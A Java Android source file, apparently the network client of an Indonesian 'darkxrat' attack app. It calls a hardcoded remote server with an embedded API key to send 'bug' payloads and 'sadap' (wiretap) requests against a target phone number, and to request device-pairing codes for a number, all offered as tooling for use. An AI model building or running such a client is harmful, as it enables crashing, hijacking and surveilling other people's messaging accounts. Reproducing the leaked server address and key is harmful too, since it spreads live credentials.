package com.darkxrat.mantax.api;

import okhttp3.*;
import com.google.gson.JsonObject;
import java.io.IOException;

public class LocalApi {

    // GANTI DENGAN DOMAIN SERVER LO
    private static final String BASE_URL = "http://zhahernode5872.cyber-cloud.web.id:2417";
    private static final String API_KEY = "ptlc_gt3ZWIxx6xnKguuZkUsgcgUCImotGzMQ3q0Zp1U4VkU";
    private static final OkHttpClient client = new OkHttpClient();
    private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");

    public interface Callback {
        void onSuccess(String response);
        void onError(String error);
    }

    // ===== KIRIM BUG =====
    public static void kirimBug(String target, String func, String bugType, Callback cb) {
        JsonObject body = new JsonObject();
        body.addProperty("target", target);
        body.addProperty("func", func);
        body.addProperty("bugType", bugType);

        Request req = new Request.Builder()
            .url(BASE_URL + "/api/bug/send")
            .addHeader("x-api-key", API_KEY)
            .post(RequestBody.create(body.toString(), JSON))
            .build();

        client.newCall(req).enqueue(new okhttp3.Callback() {
            @Override public void onFailure(Call c, IOException e) { cb.onError(e.getMessage()); }
            @Override public void onResponse(Call c, Response r) throws IOException {
                if (r.isSuccessful()) cb.onSuccess(r.body().string());
                else cb.onError("HTTP " + r.code());
            }
        });
    }

    // ===== KIRIM SADAP =====
    public static void kirimSadap(String target, String func, String sadapType, Callback cb) {
        JsonObject body = new JsonObject();
        body.addProperty("target", target);
        body.addProperty("func", func);
        body.addProperty("sadapType", sadapType);

        Request req = new Request.Builder()
            .url(BASE_URL + "/api/sadap/send")
            .addHeader("x-api-key", API_KEY)
            .post(RequestBody.create(body.toString(), JSON))
            .build();

        client.newCall(req).enqueue(new okhttp3.Callback() {
            @Override public void onFailure(Call c, IOException e) { cb.onError(e.getMessage()); }
            @Override public void onResponse(Call c, Response r) throws IOException {
                if (r.isSuccessful()) cb.onSuccess(r.body().string());
                else cb.onError("HTTP " + r.code());
            }
        });
    }

    // ===== REQUEST PAIRING CODE =====
    public static void requestPairing(String nomor, Callback cb) {
        JsonObject body = new JsonObject();
        body.addProperty("nomor", nomor);

        Request req = new Request.Builder()
            .url(BASE_URL + "/api/pairing")
            .addHeader("x-api-key", API_KEY)
            .post(RequestBody.create(body.toString(), JSON))
            .build();

        client.newCall(req).enqueue(new okhttp3.Callback() {
            @Override public void onFailure(Call c, IOException e) { cb.onError(e.getMessage()); }
            @Override public void onResponse(Call c, Response r) throws IOException {
                if (r.isSuccessful()) cb.onSuccess(r.body().string());
                else cb.onError("HTTP " + r.code());
            }
        });
    }

    // ===== CEK STATUS SERVER =====
    public static void cekStatus(Callback cb) {
        Request req = new Request.Builder()
            .url(BASE_URL + "/api/status")
            .addHeader("x-api-key", API_KEY)
            .get().build();

        client.newCall(req).enqueue(new okhttp3.Callback() {
            @Override public void onFailure(Call c, IOException e) { cb.onError(e.getMessage()); }
            @Override public void onResponse(Call c, Response r) throws IOException {
                if (r.isSuccessful()) cb.onSuccess(r.body().string());
                else cb.onError("HTTP " + r.code());
            }
        });
    }

    // ===== KIRIM PESAN BIASA =====
    public static void kirimPesan(String target, String message, Callback cb) {
        JsonObject body = new JsonObject();
        body.addProperty("target", target);
        body.addProperty("message", message);

        Request req = new Request.Builder()
            .url(BASE_URL + "/api/send")
            .addHeader("x-api-key", API_KEY)
            .post(RequestBody.create(body.toString(), JSON))
            .build();

        client.newCall(req).enqueue(new okhttp3.Callback() {
            @Override public void onFailure(Call c, IOException e) { cb.onError(e.getMessage()); }
            @Override public void onResponse(Call c, Response r) throws IOException {
                if (r.isSuccessful()) cb.onSuccess(r.body().string());
                else cb.onError("HTTP " + r.code());
            }
        });
    }
}
